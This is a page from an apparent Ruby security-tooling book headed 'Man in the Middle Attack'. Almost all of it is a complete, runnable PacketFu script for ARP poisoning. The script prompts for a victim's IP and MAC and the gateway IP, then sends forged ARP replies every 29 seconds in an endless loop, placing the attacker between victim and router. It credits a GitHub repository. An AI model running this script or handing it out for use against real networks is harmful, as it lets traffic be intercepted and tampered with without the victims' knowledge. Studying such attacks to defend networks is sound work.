# Man in the Middle Attack \(MiTM\)

Example of a more elaborate MITM attack using ARP Poisoning with PacketFU and socket using source code in this book as base.

```ruby
require 'packetfu'
require 'socket'

def poison(lip, lmac, vip, vmac, rip, int_name)
   puts "Sending ARP Packet Spoof Every 29 Seconds…"
   x = PacketFu::ARPPacket.new(:flavor => "Linux")
     x.eth_saddr = lmac  # your MAC Address
     x.eth_daddr = vmac  # victim MAC Address
     x.arp_saddr_mac = lmac # your MAC Address
     x.arp_daddr_mac = vmac # victim MAC Address
     x.arp_saddr_ip = rip # Router IP Address
     x.arp_daddr_ip=  vip # Victim IP Address
     x.arp_opcode = 2 # ARP Reply Code
   while true do # Infinite Loop created
     x.to_w(int_name) # Put Packet to wire  interface
      sleep(29) # interval in seconds, change for your preference 
   end
end

def get_ifconfig(int_name)
    int_config = PacketFu::Utils.whoami?(:iface => int_name)
    return int_config[:ip_saddr], int_config[:eth_saddr]
end

def get_victim_info()
   puts "enter victim ip"
   vip = gets
   puts "enter victim MAC"
   vmac = gets
   puts "enter gateway ip"
   rip = gets
   return vip, vmac, rip
end

# need to be root to run this

unless Process.uid.zero?
  puts "you need to run this script as root!"
  exit 0
end

#select interface to use and start setup

interfaces = Socket.getifaddrs.map { |i| i.name }.compact.uniq
list = Hash[(0...interfaces.size).zip interfaces]
list.each do |l, v|
  puts "#{l} #{v}"
end

puts "enter interface number to use on MITM"
int_number = gets
if  list.key?(int_number.to_i)
   lip, lmac = get_ifconfig(list.fetch(int_number.to_i))
   vip, vmac, rip = get_victim_info()
   poison(lip, lmac, vip, vmac, rip, list.fetch(int_number.to_i))
else
  puts "Selected interface does not exists"
end
```

Source: [Ruby-MiTM](https://github.com/ChrisFernandez/ruby-mitm "Ruby-mitm") and Rubyfu [ARP Spoofing topic](/module_0x3__network_kung_fu/arp_spoofing.md).

